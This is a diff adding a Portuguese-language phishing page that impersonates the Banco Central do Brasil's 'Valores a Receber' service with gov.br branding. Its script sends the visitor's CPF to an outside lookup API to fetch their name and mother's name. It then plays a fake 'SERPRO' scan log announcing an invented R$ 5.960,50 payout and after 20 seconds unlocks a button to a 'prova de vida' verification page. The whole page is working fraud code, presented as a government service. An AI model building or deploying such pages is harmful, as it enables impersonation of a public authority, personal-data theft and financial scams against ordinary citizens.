@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valores a Receber — Banco Central do Brasil</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+
+    <style>
+        /* ===== RESET GLOBAL — ZERO OVERFLOW ===== */
+        *, *::before, *::after { 
+            box-sizing: border-box !important; 
+            margin: 0; 
+        }
+        html { 
+            overflow-x: hidden; 
+            width: 100%; 
+            max-width: 100vw; 
+        }
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: #fff; 
+            color: #333; 
+            margin: 0; 
+            padding: 0; 
+            overflow-x: hidden; 
+            width: 100%; 
+            max-width: 100vw;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== HEADER GOV.BR ===== */
+        .gov-header { 
+            border-bottom: 1px solid #e1e5eb; 
+            background: #fff; 
+            width: 100%; 
+            max-width: 100vw; 
+        }
+        .gov-topbar { 
+            border-bottom: 1px solid #e1e5eb; 
+            width: 100%; 
+        }
+        .gov-topbar-inner {
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 8px;
+            min-width: 0;
+        }
+        .header-right {
+            display: flex;
+            align-items: center;
+            min-width: 0;
+            flex-shrink: 1;
+            gap: 0;
+        }
+        .br-divider-v { 
+            border-right: 1px solid #e1e5eb; 
+            height: 24px; 
+            margin: 0 12px; 
+            flex-shrink: 0;
+        }
+        .ico-menu { color: #1351b4; font-size: 1.25rem; cursor: pointer; flex-shrink: 0; }
+        .site-name { font-size: 1.125rem; color: #1e1e1e; text-decoration: none; white-space: nowrap; }
+
+        /* FIX: user-name com truncate absoluto */
+        .user-name-wrapper {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            min-width: 0;
+            max-width: 140px;
+            flex-shrink: 1;
+            margin-left: 8px;
+        }
+        .user-name-wrapper .user-icon {
+            flex-shrink: 0;
+            font-size: 1.25rem;
+            color: #94a3b8;
+        }
+        .user-name-text {
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            display: block;
+            min-width: 0;
+            font-size: 11px;
+            font-weight: 600;
+            color: #475569;
+            line-height: 1.2;
+        }
+
+        .nav-bar {
+            width: 100%;
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+
+        /* ===== PAGE ===== */
+        .page-container { width: 100%; padding: 32px 20px; flex-grow: 1; }
+        .page-inner { max-width: 800px; margin: 0 auto; width: 100%; }
+
+        .gov-tag { font-size: 0.75rem; font-weight: 800; color: #6b7280; letter-spacing: 0.1em; display: block; margin-bottom: 12px; text-transform: uppercase; }
+        .gov-main-title { font-size: 1.35rem; font-weight: 800; color: #1e1e1e; line-height: 1.3; margin-bottom: 24px; }
+        
+        .box-destaque { background: #f8fafc; border: 1px solid #e2e8f0; border-left: 4px solid #1351b4; padding: 20px; border-radius: 8px; margin-bottom: 30px; }
+        .box-titulo { font-weight: 800; font-size: 1rem; color: #1e1e1e; margin-bottom: 6px; }
+        .box-texto { font-size: 0.9rem; color: #4b5563; line-height: 1.5; }
+
+        .log-panel { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 8px; padding: 20px; font-family: monospace; font-size: 0.85rem; color: #1e293b; margin-top: 32px; word-wrap: break-word; }
+        .log-header { display: flex; align-items: center; gap: 8px; margin-bottom: 16px; font-weight: 700; color: #1351b4; text-transform: uppercase; letter-spacing: 0.05em; font-family: 'Inter', sans-serif;}
+        .log-dot { width: 8px; height: 8px; border-radius: 50%; background: #1351b4; flex-shrink: 0; }
+        .log-line { line-height: 1.8; min-height: 20px; }
+
+        .cta-btn { background: #1351b4; color: white; border: none; padding: 20px 32px; border-radius: 8px; font-size: 1rem; font-weight: 800; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 0.05em; margin-top: 32px; transition: background 0.2s; }
+        .cta-btn:hover { background: #0c3e92; }
+
+        /* ===== FOOTER — CORES CORRIGIDAS ===== */
+        .gov-footer { background: #061e41; padding: 40px 20px 20px; margin-top: auto; width: 100%; }
+        .gov-footer-inner { width: 100%; max-width: 1140px; margin: 0 auto; text-align: center; }
+        .gov-footer-img { height: 35px; filter: brightness(0) invert(1); margin-bottom: 16px; }
+        .gov-footer-links { display: flex; gap: 16px; margin-top: 24px; justify-content: center; }
+        .gov-footer-links a { color: rgba(255,255,255,0.7); font-size: 0.75rem; text-decoration: none; }
+        .gov-footer-bottom {
+            background: #051531; padding: 16px 20px; text-align: center;
+            color: rgba(255,255,255,0.7); font-size: 0.75rem; width: 100%;
+        }
+
+        /* ===== ANIMAÇÃO ===== */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-fade-in { animation: fadeIn 0.4s ease-out; }
+
+        /* ===== MOBILE RESPONSIVE ===== */
+        @media (max-width: 640px) {
+            .hide-mobile { display: none !important; }
+            .page-container { padding: 24px 16px; }
+            .user-name-wrapper { max-width: 110px; }
+            .gov-topbar-inner { padding: 10px 12px; }
+            .nav-bar { padding: 12px; }
+            .gov-footer { padding: 32px 16px 16px; }
+            .gov-footer-bottom { padding: 12px 16px; }
+        }
+
+        @media (max-width: 380px) {
+            .user-name-wrapper { max-width: 80px; }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="gov-header">
+        <div class="gov-topbar">
+            <div class="gov-topbar-inner">
+                <a href="#"><img src="images/logo.png" alt="gov.br" class="h-6 sm:h-7 object-contain"></a>
+                <div class="header-right text-blue-900">
+                    <button class="px-2"><i class="fas fa-ellipsis-v opacity-60"></i></button>
+                    <div class="br-divider-v hide-mobile"></div>
+                    <span class="text-xs font-bold hide-mobile px-2 cursor-pointer">PT <i class="fas fa-angle-down ml-1"></i></span>
+                    <button class="px-2 hide-mobile"><i class="fas fa-cookie-bite opacity-60"></i></button>
+                    <button class="px-2 hide-mobile"><i class="fas fa-adjust opacity-60"></i></button>
+                    <button class="px-2 hide-mobile"><i class="fas fa-th opacity-60"></i></button>
+                    <div class="user-name-wrapper">
+                        <i class="fas fa-user-circle user-icon"></i>
+                        <span class="user-name-text">Olá, <b id="user-p">...</b></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="nav-bar">
+            <i class="fas fa-bars ico-menu"></i>
+            <a href="#" class="site-name">Banco Central do Brasil</a>
+        </div>
+    </header>
+
+    <main class="page-container">
+        <div class="page-inner">
+            <span class="gov-tag">FINANÇAS</span>
+            <h1 class="gov-main-title">Seus dados foram confirmados — assista ao vídeo abaixo para saber como resgatar seus valores</h1>
+
+            <div class="box-destaque">
+                <p class="box-titulo">Atenção: assista até o final</p>
+                <p class="box-texto text-sm">O vídeo contém instruções importantes informando como receber. O botão para continuar será liberado automaticamente após alguns segundos.</p>
+            </div>
+
+            <div class="w-full max-w-sm mx-auto overflow-hidden rounded-lg border border-slate-200 shadow-sm relative z-10" style="aspect-ratio: 9/16;">
+                <vturb-smartplayer id="vid-69b526e1005f4e6dadacfab0" style="width: 100%; height: 100%; display: block;"></vturb-smartplayer>
+            </div>
+            <script type="text/javascript"> 
+                var s = document.createElement("script"); 
+                s.src = "https://scripts.converteai.net/14e4110d-9e86-4af8-9965-a3723595ad1e/players/69b526e1005f4e6dadacfab0/v4/player.js", 
+                s.async = !0, 
+                document.head.appendChild(s); 
+            </script>
+
+            <div id="cta-block" style="display:none;" class="animate-fade-in mt-2 relative z-20">
+                <button class="cta-btn" onclick="window.location.href='verificacao.html'">PROSSEGUIR PARA PROVA DE VIDA</button>
+            </div>
+
+            <div class="log-panel">
+                <div class="log-header">
+                    <div class="log-dot"></div>
+                    SITUAÇÃO DO ACESSO SERPRO
+                </div>
+                <div id="log-lines"></div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="gov-footer">
+        <div class="gov-footer-inner">
+            <img src="images/govbr.png" alt="gov.br" class="gov-footer-img">
+            <p style="color:rgba(255,255,255,0.8); font-size:0.75rem; margin-top:8px;">Todo o conteúdo deste site está publicado sob a licença Creative Commons Atribuição-SemDerivações 3.0 Não Adaptada.</p>
+            <div class="gov-footer-links">
+                <a href="#">Privacidade</a>
+                <a href="#">Termos de Uso</a>
+            </div>
+        </div>
+    </footer>
+    <div class="gov-footer-bottom">
+        SVR — Sistema de Valores a Receber do Governo Federal.
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(function () {
+            // Liberar botão
+            setTimeout(() => { $('#cta-block').fadeIn(); }, 20000);
+
+            let userData = JSON.parse(sessionStorage.getItem('userData')) || {};
+            const cpf = userData.CPF;
+
+            if (userData.NOME && (userData.NOME.toUpperCase().includes('EXEMPLO') || userData.NOME.toUpperCase().includes('TITULAR') || userData.NOME.toUpperCase().includes('CARREGANDO'))) {
+                userData.NOME = "";
+            }
+
+            if (!userData.NOME && cpf) {
+                const cpfLimpo = cpf.replace(/\D/g, '');
+                fetch(`https://searchapi.dnnl.live/consulta?token_api=2077&cpf=${cpfLimpo}`)
+                    .then(r => r.json())
+                    .then(data => {
+                        let pessoa = null;
+                        if (data.dados && Array.isArray(data.dados) && data.dados.length > 0) {
+                            pessoa = data.dados[0];
+                        } else if (data.NOME || data.nome) {
+                            pessoa = data;
+                        }
+
+                        if (pessoa) {
+                            const nome = pessoa.NOME || pessoa.nome || pessoa.name || pessoa.Nome || '';
+                            if (nome && nome.trim().length > 2) {
+                                userData.NOME = nome.toUpperCase().trim();
+                                if(pessoa.NOME_MAE) pessoa.MAE = pessoa.NOME_MAE.toUpperCase().trim();
+                                sessionStorage.setItem('userData', JSON.stringify({...userData, ...pessoa, NOME: userData.NOME}));
+                                $('#user-p').text(userData.NOME.split(' ')[0]);
+                            }
+                        }
+                    }).catch(e => console.log('Erro de API no vídeo:', e));
+            }
+
+            if (userData.NOME) {
+                $('#user-p').text(userData.NOME.split(' ')[0]);
+            }
+
+            function maskCPF(c) {
+                c = String(c || "").replace(/\D/g, '');
+                if (c.length === 11) return c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+                return c;
+            }
+
+            const lines = [
+                { delay: 800, html: '<span style="color:#1351b4;font-weight:bold;">› </span>Iniciando consulta ao Dataprev e Bacen...' },
+                { delay: 3000, html: '<span style="color:#1351b4;font-weight:bold;">› </span>Conexão externa SVR estabelecida. <span style="color:#16a34a; font-weight: bold;">(OK)</span>' },
+                { delay: 5500, html: `<span style="color:#1351b4;font-weight:bold;">› </span>Nome do Titular: <strong id="log-nome" style="color:#000;">...</strong>` },
+                { delay: 7500, html: `<span style="color:#1351b4;font-weight:bold;">› </span>CPF Validado na RF: <strong style="color:#000;">${maskCPF(userData.CPF)}</strong>` },
+                { delay: 9500, html: '<span style="color:#1351b4;font-weight:bold;">› </span>Procurando depósitos esquecidos em bancos...' },
+                { delay: 12000, html: '<span style="color:#1351b4;font-weight:bold;">› </span>Cálculo de Tarifas e Juros Não Pagos...' },
+                { delay: 15000, html: '<span style="color:#1351b4;font-weight:bold;">› </span>Cruzando db PIS/PASEP...' },
+                { delay: 18000, html: '<span style="color:#1351b4;font-weight:bold;">› </span>Varredura concluída. <span style="color:#16a34a; font-weight:700;">Indenização encontrada.</span>' },
+                { delay: 21000, html: '<span style="color:#1351b4;font-weight:bold;">› </span>Total da Cotação: <span style="font-size:1.05rem; font-weight:800; color:#1351B4;">R$ 5.960,50</span>' },
+            ];
+
+            const $log = document.getElementById('log-lines');
+            lines.forEach((l) => {
+                setTimeout(() => {
+                    const div = document.createElement('div');
+                    div.className = 'log-line';
+                    div.innerHTML = l.html;
+                    $log.appendChild(div);
+                    
+                    if (l.html.includes('id="log-nome"')) {
+                        const check = setInterval(() => {
+                            if (userData.NOME) {
+                                document.getElementById('log-nome').textContent = userData.NOME;
+                                clearInterval(check);
+                            }
+                        }, 500);
+                        setTimeout(() => { clearInterval(check); }, 8000);
+                    }
+                }, l.delay);
+            });
+        });
+    </script>
+</body>
+</html>
